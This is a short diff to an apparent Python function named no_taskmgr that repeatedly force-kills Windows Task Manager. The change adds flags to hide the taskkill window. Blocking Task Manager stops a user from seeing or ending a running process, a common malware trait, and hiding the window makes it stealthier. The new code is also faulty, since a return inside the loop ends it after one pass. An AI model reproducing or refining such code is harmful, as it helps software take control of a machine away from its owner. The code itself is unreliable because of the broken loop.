@@ -15,7 +15,12 @@ def no_taskmgr():
 import subprocess, time
 while True:
     try:
-        subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'])
+        #subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'])
+
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        return subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'], startupinfo=startupinfo).wait()
+
         time.sleep(0.5)
     except Exception:
         pass
